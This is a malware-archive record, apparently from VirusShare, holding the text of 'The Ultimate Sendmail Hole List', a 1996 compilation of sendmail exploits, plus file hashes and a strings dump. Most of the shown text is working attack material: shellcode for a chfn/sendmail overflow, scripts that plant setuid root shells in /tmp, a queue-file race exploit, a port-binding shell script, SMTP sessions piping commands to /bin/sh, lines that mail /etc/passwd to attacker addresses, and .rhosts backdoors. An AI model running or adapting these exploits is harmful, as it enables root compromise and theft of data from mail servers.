*/\n/* If you have any problems with it, send letter to me.                     */\n/*                             Have fun !                                   */\n\n\n/* -----------------   Dedicated to my beautiful lady   ------------------  */\n/* Leshka Zakharoff, 1996. E-mail: leshka@chci.chuvashia.su                 */\n\n#include <stdio.h>\nmain()\n{\nvoid make_files();\n     make_files();\n     system(\"EDITOR=./hack;export EDITOR;chmod +x hack;chfn;/usr/sbin/sendmail;e\ncho See result in /tmp\");\n}\n\nvoid make_files()\n {\n  int i,j;\n  FILE *f;\n  char nop_string[200];\n  char code_string[]=\n                      {\n                         \"\\xeb\\x50\"                         /* jmp    \ncont */\n\n/* geteip: */            \"\\x5d\"                             /* popl   \n%ebp */\n                         \"\\x55\"                             /* pushl  \n%ebp */\n                         \"\\xff\\x8d\\xc3\\xff\\xff\\xff\"         /* decl   \n0xffffffc3(%ebp) */\n                         \"\\xff\\x8d\\xd7\\xff\\xff\\xff\"         /* decl   \n0xffffffd7(%ebp) */\n                         \"\\xc3\"                             /* ret */\n\n/* 0xffffffb4(%ebp): */ \"cp /bin/sh /tmp\"\n/* 0xffffffc3(%ebp): */ \"\\x3c\"\n                        \"chmod a=rsx /tmp/sh\"\n/* 0xffffffd7(%ebp): */ \"\\x01\"\n                        \"-leshka-leshka-leshka-leshka-\"    /* reserved */\n\n/* cont:  */            \"\\xc7\\xc4\\x70\\xcf\\xbf\\xef\"         /* movl   \n$0xefbfcf70,%esp */\n                        \"\\xe8\\xa5\\xff\\xff\\xff\"             /* call   \ngeteip */\n                        \"\\x81\\xc5\\xb4\\xff\\xff\\xff\"         /* addl   \n$0xb4ffffff,%ebp */\n                        \"\\x55\"                             /* pushl  %ebp */\n                        \"\\x55\"                             /* pushl  %ebp */\n                        \"\\x68\\xd0\\x77\\x04\\x08\"             /* pushl  \n$0x80477d0\n */\n                        \"\\xc3\"                             /* ret */\n                        \"-leshka-leshka-leshka-leshka-\"    /* reserved */\n                        \"\\xa0\\xcf\\xbf\\xef\"\n                     };\n\n  j=269-sizeof(code_string);\n  for(i=0;i<j;nop_string[i++]='\\x90');\n  nop_string[j]='\\0';\n\n  f=fopen(\"user.inf\",\"w\");\n  fprintf(f,\"#Changing user database information for leshka\\n\");\n  fprintf(f,\"Shell: /usr/local/bin/bash\\n\");\n  fprintf(f,\"Location: \\n\");\n  fprintf(f,\"Office Phone: \\n\");\n  fprintf(f,\"Home Phone: \\n\");\n  fprintf(f,\"Full Name: %s%s\\n\",nop_string,code_string);\n  fclose(f);\n\n  f=fopen(\"hack\",\"w\");\n  fprintf(f,\"cat user.inf>\\\"$1\\\"\\n\");\n  fprintf(f,\"touch -t 2510711313 \\\"$1\\\"\\n\");\n  fclose(f);\n}\n\n................................ Cut Here ................................\n\n\n= mime7to8() =                 *8.8.0*\n\nAn attacker can simply create a very large message in which each line \nends with \"=\" and use it to overwrite the sendmail process's stack.\nHere the bug is only described... why doesn't someone write an exploit?!\n\n------\nThere is a serious bug in the mime7to8() function of sendmail 8.8.0\nwhich allows anyone who can send you mail to execute arbitrary code as\nroot on your machine.  I think mime7to8() only gets invoked if you set\nthe undocumented \"9\" mailer flag.  However, this flag is set by\ndefault in the cf/mailer/local.m4 file that ships with sendmail\n8.8.0.  Thus, if you are using an old V6 format configuration file\nfrom sendmail 8.7, you are probably safe, but if you generated a new\nV7 configuration file, you are probably vulnerable to this bug.\n\nNow here are the technical details:\n\nThe inner loop of mime7to8() looks like this:\n\n        u_char *obp;\n        char buf[MAXLINE];\n        u_char obuf[MAXLINE];\n\n        ....\n\n                /* quoted-printable */\n                obp = obuf;\n                while (fgets(buf, sizeof buf, e->e_dfp) != NULL)\n                {\n                        if (mime_fromqp((u_char *) buf, &obp, 0, MAXLINE) == 0)\n                                continue;\n\n                        putline((char *) obuf, mci);\n                        obp = obuf;\n                }\n\nWhen mime_fromqp() encounters a line that ends \"=\\n\", it chops those\ntwo characters off and returns 0 to indicate a continuation line.\nThis causes the while loop to continue, reading another input line and\nappending its contents to obuf.  However, when the loop continues\nwithout resetting obp to obuf, there are fewer than MAXLINE characters\nleft in the output buffer.  This means an attacker can simply create a\nvery large message in which each line ends with \"=\".  Eventually obp\nwill move beyond the end of obuf and start writing almost arbitrary\ndata to the sendmail process's stack (as long as no bytes are 0).\n\n--------\n\n\n= smtpd =                      *8.7-8.8.2*\n\nRead the exploit and don't bother:\n\n------------------------------ Cut Here --------------------------------\n\n#/bin/sh\n#\n#\n#                                   Hi !\n#                This is exploit for sendmail smtpd bug\n#    (ver. 8.7-8.8.2 for FreeBSD, Linux and may be other platforms).\n#         This shell script does a root shell in /tmp directory.\n#          If you have any problems with it, drop me a letter.\n#                                Have fun !\n#\n#\n#                           ----------------------\n#               ---------------------------------------------\n#    -----------------   Dedicated to my beautiful lady   ------------------\n#               ---------------------------------------------\n#                           ----------------------\n#\n#          Leshka Zakharoff, 1996. E-mail: leshka@leshka.chuvashia.su\n#\n#\n#\necho   'main()                                                '>>leshka.c\necho   '{                                                     '>>leshka.c\necho   '  execl(\"/usr/sbin/sendmail\",\"/tmp/smtpd\",0);         '>>leshka.c\necho   '}                                                     '>>leshka.c\n#\n#\necho   'main()                                                '>>smtpd.c\necho   '{                                                     '>>smtpd.c\necho   '  setuid(0); setgid(0);                               '>>smtpd.c\necho   '  system(\"cp /bin/sh /tmp;chmod a=rsx /tmp/sh\");      '>>smtpd.c\necho   '}                                                     '>>smtpd.c\n#\n#\ncc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c\n./leshka\nkill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs \"[:digit:]\" \"\\n\"\n|head -n 1`\nrm leshka.c leshka smtpd.c /tmp/smtpd\n/tmp/sh\n\n.............................. Cut Here ...................................\n\n\n...............................oO THe eND Oo...............................\n\n============= Credits ===============\nAll this info was mainly grabbed from: \n\n- Bugtraq\n- 8lgm\n- In***ax Digest\n- \"Improving the Security of Your Site by Breaking Into it\"\n    By Dan Farmer & Wietse Venema\n- \"Sendmail Bug Exploits List v.04b\" \n    By Per1com/Xer0\n- \"Time For a Change\" #1 'UNIX problems, for fun and exploit.' \n    By Ghost in the Machine  \n\u001a"
    },
    "filename": "VirusShare_42b10316215304b455de89d2f1eafd40",
    "filesize": 66368,
    "filetype": "data",
    "hashes": {
        "md5": "42b10316215304b455de89d2f1eafd40",
        "sha1": "be91500d6b832029b504bdd41a1b89e1c9dcdf17",
        "sha256": "e2ad535e4d18943c85195316b9693d96e69141ef58ab891eb46ba7645b973ffe"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "The Ultimate Sendmail Hole List                Data Collected by: Zhart",
            "                                                   25/11/96  Italy  ",
            "I wanna say that I don't take any credit for this text, I simply collected",
            "and reorganized all the info that was all around for my harddisk (and in my",
            "head), just commented some bugs or added something; sometimes I haven't ",
            "even tested the source codes. ",
            "I started compiling this list for my own use, then I thought it would be ",
            "interesting also for other ppl, mainly beginners, or maybe nobody.   ",
            "For any comments you can reach me on L.O.R.E. bbs",
            "-----------------------------------------------------------------",
            "  Hole                         Version of Sendmail",
            "-----------------------------------------------------------------",
            "= WIZ =                        *oLD*",
            "= DEBUG =                      *oLD*",
            "= TURN =                       *oLD*  ",
            "= OVERFLOW INPUT BUFFER =      *oLD*   ",
            "= DECODE ALIAS =               *VrFy*         ",
            "= qf SunOS =                   *SunOS-sendmailV5.1*",
            "= -oR SunOS =                  *SunOS-sendmailV5.22*",
            "= -oM =                        *8lgm6Dec1994-SMI-Sendmail(sm based on SunOS)*",
            "= OVERWRITE FILES =            *FiXED iN 5.59*",
            "= -oQ =                        *DuNNo*",
            "= |PROGRAM =                   *TeSTeD oN 5.55*",
            "= .forward =                   *5.61*",
            "= TAIL =                       *TeSTeD oN 5.65*",
            "= -C =                         *oLD* ",
            "= 4.1 =                        *TeSTeD oN 4.1*      ",
            "= -d########### =              *8.X.X <8.6.7*",
            "= -oE/filename bounce=         *8.6.7*",
            "= 8.6.9 ident =                *8.6.9*",
            "= 8.6.9 newlines =             *8.6.9*",
            "= 8.6.10 ident/newlines =      *8.6.10*",
            "= HP-UX =                      *HP-UX 9.x*",
            "= 8.7.5 gecos =                *8.X.X <8.8.0* *TeSTed oN 8.6.12*",
            "= mime7to8() =                 *8.8.0*",
            "= smtpd =                      *8.7-8.8.2*",
            "----------------------------------------------------------------",
            "= WIZ =          *oLD*",
            "   The oldest and easiest hole in sendmail is the 'wiz' backdoor, ",
            "   now very difficult to find. At the connect just type 'wiz' and ",
            "   then 'SHELL' ,and you're in a root shell.",
            "   [ it can be set by configuring sendmail.cf file ... 'OW' option",
            "     immediately followed by the encrypted password ]",
            "= DEBUG =        *oLD*   ",
            "This bug was used by the inet worm by Robert T. Morris Jr. ",
            "Its exploiting allows anyone to execute any program on a remote machine.",
            "It simply consists in giving the 'debug' command, use a pipe to /bin/sh ",
            "as recipient and feed the data with the commands you want to be executed",
            "on the remote machine.",
            "[ If sendmail server answers with \"200 Debug set\" to the 'debug' command",
            "  there are good chances the bug is still present ]",
            "Example :",
            "#!/bin/sh",
            "telnet << EOF",
            "open fucked.host.edu 25",
            "debug                  ",
            "mail from: </dev/null>  ",
            "rcpt to: <\\\"|sed -e '1,/^$/'d | /bin/sh ; exit 0\\\"> ",
            "data",
            "cp /bin/sh /tmp/sushi          # or alternatively: ",
            "chmod 4755 /tmp/sushi          # echo \"+ +\" >> /.rhosts",
            "= TURN =                          *oLD*",
            "    ",
            "   TURN command allows mail to be stolen ...",
            "[ Don't bother, old stuff! ]",
            "= OVERFLOW INPUT BUFFER =         *oLD*",
            "   Cause the sendmail deamon to lock up ...",
            "[ old stuff! Just for collection ;) ]",
            "= DECODE ALIAS =                  *VrFy*",
            "If '/etc/aliases' contains \"|/usr/bin/uudecode\" anyone can send mail to ",
            "decode, write to any file onwed by daemon, if they can connect to sendmail ",
            "daemon, can write to any file owned by any user.",
            "To test the existence of decode alias from a sendmail connection do:",
            "% telnet target.com",
            "Trying 127.127.127.127",
            "Connected to target.com",
            "Escape character is '^]'.",
            "220 target.com Sendmail Sendmail 5.55/victim ready at Fri, 6 Nov 93 18:00 PDT",
            "expn decode",
            "250 <\"|/usr/bin/uudecode\">",
            "quit",
            "/\\/ 1SecExploit \\/\\:",
            "% echo \"myhost.com\" | uuencode /usr/bin/.rhosts | mail decode@target.com",
            "/\\/ MoreThan1SecExploit \\/\\:",
            "% cat > outfile                  # Let's make our .rhosts file",
            "% uuencode outfile /usr/bin/.rhosts",
            "begin 644 /bin/.rhosts",
            "$*R'K\"O\\",
            "% telnet fuqdhost.com 25",
            "220 fuqdhost.com SunOS Sendmail 8.6.1 #5 ready at Fri, 13 May 99 00:00 (EST)",
            "VRFY decode",
            "250 <|/usr/bin/uudecode>",
            "MAIL FROM: bin",
            "250 <bin> ... Sender Okay",
            "RCPT TO: decode",
            "250 <decode> ... Recipient Okay",
            "DATA",
            "354 Enter mail, end with \".\" on a line by itself",
            "begin 644 /bin/.rhosts",
            "$*R'K\"O\\                       # which is just \"+ +\" uuencoded",
            "250 Mail accepted",
            "quit",
            "221 fuqdhost.com closing connection",
            "Connection closed by foreign host.",
            "% rlogin fuqdhost.com -l bin",
            "If no home directories are known or writable, an interesting variation",
            "of this is to create a bogus /etc/aliases.pag file that contains an",
            "alias with a command you wish to execute on your target.  This may work",
            "since on many systems the aliases.pag and aliases.dir files, which",
            "control the system's mail aliases, are writable to the world.",
            " evil % cat decode",
            " bin: \"| cat /etc/passwd | mail zen@evil.com\"",
            " evil % newaliases -oQ/tmp -oA`pwd`/decode",
            " evil % uuencode decode.pag /etc/aliases.pag | mail decode@victim.com",
            " evil % /usr/lib/sendmail -fbin -om -oi bin@victim.com < /dev/null",
            "= qf SunOS =                    = SunOS-sendmailV5.1 = ",
            "The method used by sendmail version 5 to open a control file ",
            "[/usr/spool/mqueue/qf########] is unsecure.  ",
            "A race condition exists whereby another process may obtain a control-file ",
            "file descriptor, opened for write access.",
            "Sendmail v5, during execution, sets umask(0), which is an insecure mask.  ",
            "In order not to leave open control files with mode 666, sendmail v5 uses ",
            "chmod(2) to set a secure file mode.  ",
            "However this is a race condition, as we can obtain an open file descriptor",
            "for write by opening the control file before the call to chmod(2).",
            "IMPACT: Local users can write their own control files, and run programs",
            "        as any user, bar root. ",
            "EXPLOIT: ",
            "grabfd.c:",
            " * grabfd.c",
            " * usage: grabfd username command-file",
            " *      username: user to execute 'command-file' as.",
            " *      command-file: file containing 10 lines of shell commands to execute.",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <sys/fcntl.h>",
            "#include <sys/param.h>",
            "#ifndef SENDMAIL",
            "#define SENDMAIL \"/usr/lib/sendmail\"",
            "#endif",
            "#ifndef SPOOL_DIR",
            "#define SPOOL_DIR \"/usr/spool/mqueue\"",
            "#endif",
            "char myqfile[] = \"D%s\\nC%s\\nR|/usr/ucb/tail|/bin/sh\\n\";",
            "main(argc,argv)",
            "int argc;",
            "char **argv;",
            "        int pid, fd;",
            "        char tbuf[MAXPATHLEN], sysbuf[BUFSIZ];",
            "        if (argc != 3) {",
            "                (void)fprintf(stderr, \"%s: user file\\n\",",
            "                        argv[0]);",
            "                exit(1);",
            "        }",
            "        if (getpwnam(argv[1]) == NULL)",
            "                (void)fprintf(stderr, \"%s: user %s unknown (error ",
            "ignored)\\n\",",
            "                        argv[0],",
            "                        argv[1]);",
            "        if (access(argv[2], F_OK) == -1) {",
            "                (void)fprintf(stderr, \"%s: %s does not exist.\\n\",",
            "                       argv[0],",
            "                       argv[2]);",
            "                exit(1);",
            "        }",
            "        if (access(SPOOL_DIR, X_OK) == -1) {",
            "                (void)fprintf(stderr, \"%s: cannot access %s.\\n\",",
            "                        argv[0],",
            "                        SPOOL_DIR);",
            "                exit(1);",
            "        }",
            "        if (pid=fork()) {",
            "                if (pid == -1) {",
            "                        (void)perror(\"fork\");",
            "                        exit(1);",
            "                }",
            "                (void)sprintf(tbuf, \"%s/tfAA%05d\", SPOOL_DIR, pid);",
            "                (void)sprintf(sysbuf, myqfile, argv[2], argv[1]);",
            "                for (;;)",
            "                        if ((fd=(open(tbuf, O_WRONLY, 0))) != -1) {",
            "                                (void)printf(\"%s: grabbed queue fd.\\n\",",
            "                                             argv[0]);",
            "                                (void)wait();",
            "                                (void)ftruncate(fd, 0);",
            "                                (void)write(fd, sysbuf, strlen(sysbuf));",
            "                                (void)close(fd);",
            "                                if(execl(SENDMAIL,",
            "                                      \"sendmail\", \"-q\", (char *)0) == -1) {",
            "                                        (void)perror(\"execl\");",
            "                                        exit(1);",
            "                                        };",
            "                        }",
            "        } else {",
            "                (void)close(0);",
            "                if (open(\"/etc/motd\", O_RDONLY, 0) == -1) {",
            "                        (void)perror(\"open\");",
            "                        exit(1);",
            "                };",
            "                if (execl(SENDMAIL,",
            "                          \"sendmail\",",
            "#ifdef sun",
            "                          \"-os\",",
            "#endif",
            "                          \"-odq\", getlogin(), (char *)0) == -1) {",
            "                        (void)perror(\"execl\");",
            "                        exit(1);",
            "                };",
            "        }",
            "        exit(1);",
            "::::::::::::::::::::::::::::::::: END OF HOLE ::::::::::::::::::::::::::::",
            "= -oR SunOS =             *SunOS-4.1.X-sendmailV5.22*",
            "From 8lgm:",
            "----------",
            "DESCRIPTION:   The -oR option uses popen() to return undeliverable mail.",
            "IMPACT:        Local users can obtain root access.",
            "-------------------------- ropt.sh ---------------------------------------",
            "#!/bin/sh",
            "# Syntax: roption host",
            "# host is any system running sendmail (except localhost).",
            "# This exploits a flaw in SunOS sendmail(8), and attempts",
            "# create a suid root shell",
            "# Written 1995 by [8LGM]",
            "# Please do not use this script without permission.",
            "PROG=\"`basename $0`\"",
            "PATH=/usr/ucb:/usr/bin:/bin      export PATH",
            "IFS=\" \"                          export IFS",
            "# Check args",
            "if [ $# -ne 1 ]; then",
            "        echo \"Syntax: $PROG host\"",
            "        exit 1",
            "# Check we're on SunOS",
            "if [ \"x`uname -s`\" != \"xSunOS\" ]; then",
            "        echo \"Sorry, this only works on SunOS\"",
            "        exit 1",
            "PROG=\"`basename $0`\"",
            "EXECME=/tmp/HotterThanMojaveInMyHeart",
            "# Create EXECME.c",
            "cat > $EXECME.c << 'EOF'",
            "main(argc,argv)",
            "int argc;",
            "char *argv[];",
            "        chown(\"/tmp/InfamousAngel\", 0, 0);",
            "        chmod(\"/tmp/InfamousAngel\", 04755);",
            "cc -o $EXECME $EXECME.c",
            "# Check we have EXECME",
            "if [ ! -x $EXECME ]; then",
            "        echo \"$PROG: couldnt compile $EXECME.c - check it out\"",
            "        exit 1",
            "/bin/cp /bin/sh /tmp/InfamousAngel",
            "# Run sendmail",
            "/usr/lib/sendmail -oR$1 -f\";$EXECME;\" -t << 'EOF'",
            "To: No1InParticular",
            "Hows it goin",
            "exec /tmp/InfamousAngel",
            "................................ Cut HeRe ...................................",
            "= -oM =                   *8lgm6Dec1994-SMI-Sendmail(based on SunOS sm)*",
            "Sun sendmail allows -oM to set any macro, and still retains",
            "root privilege. ( The list of 'trusted' macros should be limited. )",
            "At time of writing (Dec 1994) affected sendmail were:",
            "\" SunOS 4.x Sendmail - all versions including latest",
            "                     4/5/94 Sendmail Jumbo Patch 100377-15 \"",
            "After further investigation, it has been discovered that SVR4 based",
            "ports include sendmail(8) based on SMI code.",
            "EXPLOIT:",
            "        1. Create the file sunsendmailcp",
            "8>------------------------- cut here ---------------------------",
            "#!/bin/sh",
            "# sunsendmailcp from to",
            "if [ $# -ne 2 ]; then",
            "        echo usage: `basename $0` from to",
            "        exit 1",
            "rm -f /usr/tmp/dead.letter",
            "if [ -f /usr/tmp/dead.letter ]; then",
            "        echo sorry, cant continue - /usr/tmp/dead.letter exists",
            "if [ ! -r $1 ]; then",
            "        echo $1 doesnt exist or is unreadable",
            "        exit 1",
            "ln -s $2 /usr/tmp/dead.letter",
            "/usr/lib/sendmail -L0 '-oM#anything' $USER < $1",
            "rm /usr/tmp/dead.letter",
            "exit 0",
            "8>------------------------- cut here ---------------------------",
            "        2. Execute the command",
            "           % ./sunsendmailcp sourcefile targetfile",
            "           and target file will either be appended to or created.",
            "..................................         .................................",
            "= OVERWRITE FILES =     *FiXED iN 5.59* ",
            "Remote users are able to write to any *non-root* owned files in the system.",
            "This bug was definitely fixed in version 5.59 from Berkeley;",
            "despite the messages below, for versions of sendmail previous to 5.59,",
            "the \"evil.com\" gets appended, despite the error messages, along",
            "with all of the typical mail headers, to the file specified:",
            " % cat evil_sendmail",
            " telnet victim.com 25 << EOSM",
            " rcpt to: /home/zen/.rhosts",
            " mail from: zen",
            " data",
            " random garbage",
            " rcpt to: /home/zen/.rhosts",
            " mail from: zen",
            " data",
            " evil.com",
            " quit",
            " EOSM",
            " evil % /bin/sh evil_sendmail",
            " Trying 128.128.128.1",
            " Connected to victim.com",
            " Escape character is '^]'.",
            " Connection closed by foreign host.",
            " evil % rlogin victim.com -l zen",
            "         Welcome to victim.com!",
            " victim %",
            "= '-oQ' =                   *DuNNo*                                    ",
            "          ",
            "This bug involves the '-q' and the '-oQ' options and causes any file to be ",
            "deleted and read.",
            "You should create a 'qf'-type file, in the /usr/spool/mqueue dir, like this:",
            "                                           ",
            "T599831504",
            "Dfilename",
            "Suser",
            "Ruser",
            "H?P?return-path: <user>",
            "H?F?from: user (User Name)",
            "H?x?full-name: User Name",
            "HTo: user",
            "Hsubject: Gotcha",
            "after the command `sendmail -q -oQ' is issued, file `filename'",
            "will be deleted and its content will be mailed to 'user'.",
            "- - - -",
            "The 'oQ' sets the 'Q' option ,which selects the dir in which to queue messages",
            "The 'q' make the daemon to process the queue",
            "- - - -",
            "= '|PROGRAM ' =     *TeSTeD oN 5.55* ...may be others",
            "Anyone can specify arbitrary shell commands and/or pathnames for the ",
            "sender and/or destination address.",
            "A typical attack to get the password file is:",
            " % telnet target.com 25",
            " Trying 123.456.789.0...",
            " Connected to target.com",
            " Escape character is '^]'.",
            " 220 target.com Sendmail 5.55 ready at Mon, 12 Dec 93 23:51",
            " mail from: \"|/bin/mail me@myhost.com < /etc/passwd\"",
            " 250 \"|/bin/mail me@myhost.com < /etc/passwd\"... Sender ok",
            " rcpt to: mickeymouse",
            " 550 mickeymouse... User unknown",
            " data",
            " 354 Enter mail, end with \".\" on a line by itself",
            " 250 Mail accepted",
            " quit",
            " Connection closed by foreign host.",
            "= .forward =                *5.61*        ",
            "When delivering to files and programs, `sendmail' does not do an",
            "`initgroups(3)' after forking on final delivery.  As a result, the sender's",
            "group list remains in effect throughout this stage.  This is particularly",
            "serious when root is sending the mail since a program executed out of a",
            "`.forward' file gains interesting privileges like `wheel' and `kmem'.  A",
            "related hole can be broken down into a \"problem\" and an \"aggravation\".  The",
            "\"problem\" is that queued local mail no longer has the original recipient's",
            "uid associated with it. Control files only store a list of exploded",
            "recipients (i.e. users, files and programs) -- one per line -- each",
            "prefaced with an `R'.  So, after an address resolves to the local machine",
            "and has undergone alias and \".forward\" expansion, if the letter happens to",
            "get queued, on the succeeding queue run sendmail doesnt know who to run the",
            "final delivery as.  The \"aggravation\" is that, when doing this final",
            "delivery of queued local mail, sendmail will `setuid()' itself to",
            "the sender's uid if it is available; in general, the sender's uid will be",
            "used when the sender is on the local machine. As a result, a user can run a",
            "program as anyone who sends them mail from the local machine.  There is",
            "also an added \"complication\"; the default uid and gid are also set to the",
            "sender when delivering mail!  Since the default uid and gid are only used",
            "when calling `setuid()' and `setgid()' (to reset the uid/gid before doing",
            "final delivery), these variables should never be set to the sender.",
            "==========================   Local compromise   ==========================",
            "Save the following program as \"sploit.c\" changing MYUID to your user id.",
            "Compile \"sploit.c\" producing the executable \"sploit\" in your home",
            "directory.  Create a \".forward\" file containing:",
            "     \\<user>, \"|<path>/sploit\"",
            "[change <user> to your username so you dont lose mail (unless, of",
            "course, you'd rather lose mail) and set <path> to your home directory",
            "path (where sploit lives)] Now, as another user, send yourself some",
            "mail.  Note that the sploit program defers delivery the first time thru;",
            "check out \"/tmp/whoami\" to see that sploit ran as you.  Now, run your",
            "mail queue (or open a beer and wait for sendmail to run it). After the",
            "queue run, note that the sploit accepted the letter and returned a",
            "successful exit status; check out \"/tmp/whoami\" again to see that this",
            "time, sploit ran as the sender! You can also use \"sploit.c\" to test for",
            "the root initgroups() hole by checking the group list when \"sploit\" was",
            "first called.",
            "     #include <sys/param.h>",
            "     #include <sys/types.h>",
            "     #include <stdio.h>",
            "     #include <sysexits.h>",
            "     #include <pwd.h>",
            "     #include <grp.h>",
            "     #define MYUID 777 /* your uid (i.e. your \".forward\" invokes this) */",
            "     #definegetuser(uid)getpwuid(uid)->pw_name/* assume valid uid */",
            "     #definegetgrp(gid)getgrgid(gid)->gr_name/* assume valid gid */",
            "     main()",
            "     {",
            "     FILE *fp;",
            "     uid_t myuid;",
            "     int i, rval, ngrps, grplst[NGROUPS];",
            "     if ((myuid = getuid()) == MYUID)",
            "     rval = EX_TEMPFAIL;",
            "     else",
            "     rval = EX_OK;",
            "     if ((fp = fopen(\"/tmp/whoami\", \"a\")) != NULL) {",
            "     /* real user/group ids */",
            "     fprintf(fp, \"%susr:%s grp:%s\",",
            "     (rval == EX_OK)? \"\": \"Def> \",",
            "     getuser(myuid), getgrp(getgid()));",
            "     /* effective user/group ids */",
            "     fprintf(fp, \" eusr:%s egrp:%s\",",
            "     getuser(geteuid()), getgrp(getegid()));",
            "     /* group list */",
            "     if ((ngrps = getgroups(NGROUPS, grplst)) > 0) {",
            "     fprintf(fp, \" grps:\");",
            "     for (i = 0; i < ngrps; i++)",
            "     fprintf(fp, \" %s\", getgrp(grplst[i]));",
            "     }",
            "     fprintf(fp, \"\\n\");",
            "     (void) fclose(fp);",
            "     }",
            "     exit(rval);",
            "     }",
            "--------------------- CuT HeRe -------------------------------------------------",
            "=====================  trick for sendmail 5.61  ===========================",
            " * 1) set the #define UID, at the top of the program to be your's",
            " * 2) create a file: /tmp/.shell, which is a script to make a suid shell",
            " * 3) compile the program and name it say, /tmp/.magic",
            " * 4) create a .forward file containing: '|/tmp/.magic'",
            " * 5) 'telnet yoursystem 25' and send yourself some fakemail from whoever",
            " *    you want a shell from (but not root :-( RATS!)",
            " * 6) wait abit, it usually works ...",
            "#define UID 777   /* change to your uid */",
            "#include <sys/param.h>",
            "#include <sys/types.h>",
            "#include <stdio.h>",
            "#include <sysexits.h>",
            "#include <pwd.h>",
            "#include <grp.h>",
            "#define SHELLFILE  \"/tmp/.shell\"",
            "main()",
            "        int myuid, rval;",
            "        if ((myuid = getuid()) == UID)",
            "                rval = EX_TEMPFAIL;",
            "        else {",
            "                rval = EX_OK;",
            "                system(SHELLFILE);",
            "        }",
            "        exit(rval);",
            "------------------------------ CuT HeRe --------------------------------",
            "= Tail creates a daemon shell =     *TeSTeD oN 5.65*",
            "Through this sendmail bug, it is possible to become uid daemon (or",
            "whatever your sendmail delivers non-user mail as), or the uid of any",
            "user. The specifics are as follows:",
            "*       The envelope From: field, or possibly the Errors-To: header (but",
            "I've not tested it), must be set to the pipe through a bounce of your",
            "mail will be returned. Typically this is executed by uid daemon.",
            "*       An error must be caused in the message such that sendmail will send",
            "a bounce to the From: envelope (or possibly to Errors-To:).",
            "These two conditions are all that is necessary to exploit the bug. ",
            "Typically the simplest thing to pipe to is",
            "        |/usr/ucb/tail|/usr/bin/sh",
            "aka     |/usr/ucb/tail|/bin/sh",
            "That's for SunOS 4.1.3. Other systems may have tail in /usr/bin or",
            "/bin/; the PATH is important in the case.",
            "The condition we have used to generate an error is an invalid",
            "Return-Receipt-To: header. There are a plethora of other ways to do",
            "so, and some of them may depend on the specifics of your sendmail; be",
            "forewarned.",
            "The last ten lines of your message should contain whatever you wish to",
            "do as uid daemon.",
            "---cut here",
            "[panix!jhawk] |% telnet panix.com 25",
            "Trying 198.7.0.2 ...",
            "Connected to panix.com.",
            "Escape character is '^]'.",
            "220 panix.com 5.65c/IDA-1.4.4 Sendmail is ready at Mon, 8 Nov 1993 19:41:13",
            "-0500",
            "HELO",
            "250 Hello panix.com, why do you call yourself ?",
            "MAIL FROM: |/usr/ucb/tail|/usr/bin/sh",
            "250 |/usr/ucb/tail|/usr/bin/sh... Sender ok",
            "RCPT TO: root",
            "250 root... Recipient ok",
            "DATA",
            "354 Enter mail, end with @.@ on a line by itself",
            " From: jhawk\"panix.com (John Hawkinson)",
            "  To: jhawk\"panix.com (John Hawkinson)",
            "  Return-Receipt-To: |foobar",
            "  Subject: This is a large hole in the ground.",
            "  X-Disclaimer: We take no responsibility for what might happen",
            "  Hi there. Wanna play ball?",
            "  #!/bin/sh",
            "  #The above line is just in case :-)",
            "  echo This is a Serious Bug > /tmp/bug",
            "  echo id reports: >> /tmp/bug",
            "  /usr/bin/id >> /tmp/bug",
            "  echo Fixing this would be good >> /tmp/bug",
            "  cp /bin/sh /tmp/bugshell",
            "  chmod u+s /tmp/bugshell",
            "  echo /tmp/bugshell contains a setuid daemon shell >> /tmp/bug",
            "  chmod ugo+rx /tmp/bugshell",
            "250 Ok",
            "quit",
            "221 panix.com closing connection",
            "------------------------- CuT HeRe ----------------------------------------",
            "= \"-C\" =                     *oLD*     ",
            "Read any file.",
            "Using the '-C' option causes an alternative configuration file to be used,",
            "if the file is a protected file which is actually not a send mail ",
            "configuration file, `sendmail' will print out some contents of the file ",
            "as an error message.",
            "It is reported working on DYNIX (3.0.14)  and  ULTRIX (2.X) ",
            "$ sendmail -C /etc/shadow",
            "<contents of /etc/shadow>",
            "= 4.1 =                  *TeSTeD oN 4.1*",
            "It allows remote access as bin...and since bin owns the /etc dir you",
            "can gain root.",
            "Rsend needs mconnect, which is a binary, which just connects to the place",
            "and sends the data.  You can get rid the of ()'s at the beginninga and end",
            "of the script, and get rid of the mconnect line, and run like ./rsend >",
            "file, then ascii U/L the file to port 25...If it says a lot of stuff like",
            "\"Command Ununown\" 25 times, then it didn't work.",
            "Here's rsend:",
            "#!/bin/sh",
            "# Copyright, 1992, 1993 by Scott Chasin (chasin@crimelab.com)",
            "# This material is copyrighted by Scott Chasin, 1992, 1993. The",
            "# usual standard disclaimer applies, especially the fact that the",
            "# author is not liable for any damages caused by direct or indirect",
            "# use of the information or functionality provided by this program.",
            "# Description:",
            "# Exploit NEW sendmail hole  and bind a port so we can spawn a program.",
            "# Not for distribution under any circumstances",
            "# Usage: smail <hostname> <target-user-name> <target-port> <shell command>",
            "# default: smail <localhost> <daemon> <7001> </bin/sh>",
            "port=$3",
            "user=$2",
            "cmd=$4",
            "if [ -z \"$2\" ]; then",
            "   user=daemon",
            "if [ -z \"$3\" ]; then",
            "   port=7002",
            "if [ -z \"$4\" ]; then",
            "   cmd=\"/bin/csh -i\"",
            "sleep 4",
            "echo \"helo\"",
            "echo \"mail from: |\"",
            "echo \"rcpt to: bounce\"",
            "echo \"data\"",
            "echo \".\"",
            "sleep 3",
            "echo \"mail from: $user\"",
            "echo \"rcpt to: | sed '1,/^$/d' | sh\"",
            "echo \"data\"",
            "echo \"cat > /tmp/a.c <<EOF\"",
            "cat <<  EOF",
            "#include <sys/types.h>",
            "#include <sys/signal.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;",
            "int **av;{struct sockaddr_in mya;struct servent *sp",
            ";fd_set muf;int myfd,new,x,maxfd=getdtablesize();",
            "signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,",
            "0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,",
            "sizeof(mya.sin_addr));if((sp=getservbyname(av[1],\"tcp\"))",
            "==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port",
            "=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,",
